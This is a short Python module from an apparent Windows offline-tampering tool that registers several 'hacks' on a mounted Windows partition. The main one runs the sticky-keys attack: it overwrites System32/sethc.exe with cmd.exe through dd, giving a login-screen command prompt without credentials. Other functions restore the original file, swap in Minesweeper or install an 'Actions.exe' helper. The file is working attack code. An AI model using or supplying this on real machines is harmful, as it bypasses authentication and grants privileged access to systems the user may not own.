from .Framework import *
from .Utils import *

# This does the sticky keys exploit
stickyhack=SimpleHack("sticky-keys","Replace sticky keys with cmd")
hacks.addHack(stickyhack)

@stickyhack.hack
def rcmd(self,args):	
	info("Overwriting sticky keys (cmd)...")
	handleBash(f"dd if=./windows-mnt/Windows/System32/cmd.exe of=./windows-mnt/Windows/System32/sethc.exe")

# This fixes sticky keys
stickydo=SimpleHack("sticky-do","Fix sticky keys")
hacks.addHack(stickydo)

@stickydo.hack
def rfix(self,args):
	info("Overwriting sticky keys (restore)...")
	handleBash(f"dd if=./files/sethc.exe of=./windows-mnt/Windows/System32/sethc.exe")

# This replaces sticky keys with minesweeper
stickymines=SimpleHack("sticky-mines","Replace sticky keys with minesweeper")
hacks.addHack(stickymines)

@stickymines.hack
def rmine(self,args):	
	info("Overwriting sticky keys (mines)...")
	handleBash(f"dd if=./files/winmineXP.exe of=./windows-mnt/Windows/System32/sethc.exe")

# This replaces sticky keys with Actions.exe
stickyactions=SimpleHack("sticky-actions","Replace sticky keys with an executable with a few useful functions.")
hacks.addHack(stickyactions)

@stickyactions.hack
def ractions(self,args):
	info("Putting minesweeper in sys32...")
	handleBash("cp ./files/winmineXP.exe ./windows-mnt/Windows/System32/")
	info("Overwriting sticky keys (actions)...")
	handleBash(f"dd if=./files/Actions.exe of=./windows-mnt/Windows/System32/sethc.exe")

stickyhack.priority=-0.1 #last
stickydo.priority=-0.2
stickymines.priority=-0.3 #first